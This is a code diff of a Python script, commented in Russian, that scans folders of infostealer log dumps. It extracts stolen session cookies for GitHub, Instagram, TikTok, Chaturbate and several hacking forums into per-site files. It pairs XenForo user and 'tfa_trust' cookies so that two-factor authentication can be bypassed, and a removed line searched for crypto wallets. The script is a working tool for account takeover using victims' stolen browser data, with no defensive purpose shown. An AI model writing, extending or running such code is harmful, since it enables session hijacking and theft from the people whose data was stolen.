@@ -41,14 +41,65 @@ def fast_search(directory: str, extensions: tuple = ('.seco', '.txt'), threads_c
     return results
 
 def read_cookie(txt: str):
+	template = [
+		{"url": "bhf.pro", "cookie": ["xf_user", "xf_tfa_trust"]},
+		{"url": "lolz.live", "cookie": ["xf_user", "xf_tfa_trust"]},
+		{"url": "zelenka.guru", "cookie": ["xf_user", "xf_tfa_trust"]},
+		{"url": "raidforum.co", "cookie": ["xf_user", "xf_tfa_trust"]},
+		{"url": "cracked.io", "cookie": ["mybbuser"]},
+		{"url": "github.com", "cookie": ["user_session"]},
+
+		{"url": "chaturbate", "cookie": ["sessionid"]},
+		{"url": "instagram.com", "cookie": ["sessionid"]},
+		{"url": "tiktok.com", "cookie": ["sessionid"]},
+		
+		# {"url": "xss.is", "cookie": [""]},
+		# {"url": "forum.exploit.in", "cookie": [""]},
+
+		# {"url": "cracked.io", "cookie": ["mybbuser"]},
+		# {"url": "cracked.io", "cookie": ["mybbuser"]},
+	]
+
 	try:
 		with open(txt, "r", encoding="utf-8", errors="ignore") as f:	
+			found_cookies = {}
 			for line in f.readlines():
 				cline = line.strip().split()
-				if len(cline) == 7:
-					if "github" in cline[0]: # Если нашли нужный сайт.
-						if cline[5] == "user_session": # Поиск нужной куки
-							print(cline, txt)
+			
+				if len(cline) == 7: # текстовик похоже с куками.
+					curl 	= cline[0]
+					cname 	= cline[5]
+					cvalue 	= cline[6]
+
+					for site in template:
+						if site["url"] in curl and cname in site["cookie"]:
+							domain_name = site["url"]
+
+							if cname in ["xf_user", "xf_tfa_trust"]:
+								found_cookies[cname] = cvalue
+							else:
+								with open(f"{domain_name}.txt", "a", encoding="utf-8") as out_f:
+									out_f.write(f"{cvalue}\n")
+							break
+
+			# Если найдены обе куки `xf_user` и `xf_tfa_trust`
+			if "xf_user" in found_cookies and "xf_tfa_trust" in found_cookies:
+				with open(f"{domain_name}_2fa.txt", "a", encoding="utf-8") as out_f:
+					out_f.write(f"{found_cookies['xf_user']}:{found_cookies['xf_tfa_trust']}\n")
+			elif "xf_user" in found_cookies:
+				with open(f"{domain_name}.txt", "a", encoding="utf-8") as out_f:
+					out_f.write(f"{found_cookies['xf_user']}\n")
+
+
+					# for item in template:
+					# 	if item["url"] in curl: # Если нашли нужный сайт (не точное сравнение, поддомены , точки и т.д)								
+					# 		for qyt in item["cookie"]:
+					# 			if qyt == cname: # название кукисов (точное сравнение, нужны точные данные)
+					# 				print(cname)
+
+
+
+
 	except Exception as ex:
 		pass
 
@@ -58,22 +109,13 @@ if __name__ == '__main__':
 	root.withdraw()
 	dirname = filedialog.askdirectory()
 	threads = 10
-	start = time()
 
+	start = time()
 	files = fast_search(dirname, ('.txt'), threads)
 	total = len(files)
 	for i, txt in enumerate(files):
-		print(f"In Progress: [{total}/{i}]", end="\r")
 		read_cookie(txt)
+		print(f"In Progress: [{total}/{i}]", end="\r")
 
-	print(f'Работа окончена!\nВремя затраченное на работу {round(time() - start, 2)}s')
+	print(f'\nРабота окончена!\nВремя затраченное на работу {round(time() - start, 2)}s')
 
-
-	# txt = r'C:\Users\ADMIN\Downloads\Telegram Desktop\fatetraffic\AE[D7B474802AE000AF42976DCC4DCCB402] [2024-08-28T20_36_12.0267380+03_00]\Cookies\Google_[Chrome]_Default Network.txt'
-
-	# with open(txt, "r" ) as f:	
-	# 	for line in f.readlines():
-	# 		cline = line.strip().split()
-	# 		if len(cline) == 7:
-	# 			if "wallets" in cline[0]:
-	# 				print(cline)
